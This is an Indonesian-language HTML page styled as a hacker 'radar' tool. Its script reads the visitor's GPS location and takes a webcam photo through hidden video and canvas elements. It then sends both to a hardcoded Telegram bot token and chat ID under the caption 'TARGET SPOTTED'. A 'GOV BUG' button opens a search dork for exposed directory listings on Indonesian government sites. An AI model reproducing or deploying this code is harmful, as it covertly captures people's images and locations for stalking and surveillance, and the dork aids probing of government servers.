<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EDWARD OMNI V.181</title>
    <style>
        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --blue: #00bdff; }
        * { box-sizing: border-box; transition: 0.2s; outline: none; }
        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin:0; padding: 15px; }
        .master-name { text-align: center; font-size: 20px; font-weight: 900; color: var(--neon); text-shadow: 0 0 10px var(--neon); margin-bottom: 20px; text-transform: uppercase; }
        .card { background: rgba(10, 20, 30, 0.9); border: 1px solid rgba(0,255,136,0.2); border-radius: 15px; padding: 15px; margin-bottom: 12px; }
        h3 { margin: 0 0 10px 0; font-size: 11px; color: var(--neon); text-transform: uppercase; border-left: 3px solid var(--neon); padding-left: 10px; }
        .btn { width: 100%; padding: 12px; border-radius: 8px; border: none; cursor: pointer; font-weight: 800; font-size: 10px; text-transform: uppercase; margin-bottom: 8px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .btn-radar { background: var(--blue); color: #000; box-shadow: 0 0 10px var(--blue); }
        .btn-exploit { background: var(--neon); color: #000; }
        .mon-box { border: 1px solid rgba(0,255,136,0.3); padding: 8px; border-radius: 10px; text-align: center; color: var(--neon); font-size: 10px; background: rgba(0,0,0,0.3); margin-bottom: 12px; }
        video, canvas { display: none; }
        #log { background: #000; color: var(--neon); font-size: 9px; padding: 10px; border-radius: 8px; height: 60px; overflow-y: auto; border: 1px solid rgba(0,255,136,0.2); }
    </style>
</head>
<body>
    <p class="master-name">EDWARD OMNI V.181</p>
    <div class="mon-box">RADAR STATUS: ACTIVE | EXFILTRATION: READY</div>

    <div class="card">
        <h3>📡 ELITE RADAR (PHOTO & GEO)</h3>
        <button class="btn btn-radar" onclick="startRadar()">⚡ ACTIVATE RADAR SCAN</button>
        <div id="log">> System Standby...</div>
    </div>

    <div class="card">
        <h3>🛡️ BUG HUNTER & STRIKE</h3>
        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:8px;">
            <button class="btn btn-exploit" onclick="window.open('https://google.com/search?q=site:go.id intitle:index.of')">GOV BUG</button>
            <button class="btn" style="background:var(--red); color:#fff;" onclick="location.reload()">STOP ALL</button>
        </div>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
        const CHAT_ID = '7898572558';
        const log = document.getElementById('log');

        function addLog(m) { log.innerHTML += `<div>> ${m}</div>`; log.scrollTop = log.scrollHeight; }

        async function startRadar() {
            addLog("Radar Activated...");
            try {
                // 1. Get Geo Location
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    addLog(`Location Found: ${lat}, ${lon}`);

                    // 2. Access Camera & Capture
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    setTimeout(async () => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const dataUrl = canvas.toDataURL('image/jpeg');
                        
                        // Stop Camera
                        stream.getTracks().forEach(t => t.stop());

                        // 3. Send to Telegram
                        addLog("Exfiltrating Data to Master...");
                        
                        // Send Photo
                        const blob = await (await fetch(dataUrl)).blob();
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'radar_capture.jpg');
                        formData.append('caption', `🔱 TARGET SPOTTED\n📍 Loc: https://www.google.com/maps?q=${lat},${lon}\n👤 User: EDWARD-BAIK`);

                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });

                        addLog("DATA SENT SUCCESSFULLY! 🚀");
                    }, 1000);
                }, (err) => addLog("GPS ACCESS DENIED"));
            } catch (e) { addLog("CAM ACCESS DENIED"); }
        }
    </script>
</body>
</html>
